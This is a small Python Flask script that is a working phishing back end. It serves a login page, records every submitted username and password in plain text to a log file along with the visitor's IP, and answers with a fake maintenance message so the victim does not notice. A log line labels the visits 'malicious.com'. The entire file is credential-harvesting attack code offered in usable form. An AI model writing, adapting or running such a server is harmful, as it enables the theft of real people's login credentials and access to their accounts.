from flask import Flask, request, render_template
import logging
import os

app = Flask(__name__)

# Configure logging
logging.basicConfig(filename='logs/access.log', level=logging.INFO,
                    format='%(asctime)s - %(message)s')

@app.route('/')
def home():
    client_ip = request.remote_addr
    logging.info(f"Access from {client_ip} to malicious.com")
    return render_template('login.html')

@app.route('/login', methods=['POST'])
def login():
    username = request.form.get('username')
    password = request.form.get('password')
    client_ip = request.remote_addr
    logging.info(f"Login attempt from {client_ip} - Username: {username}, Password: {password}")
    return "The Website is under maintainance!!!"

def main():
    # Create logs directory if it doesn't exist
    os.makedirs("logs", exist_ok=True)
    app.run(host='0.0.0.0', port=80)

if __name__ == "__main__":
    main()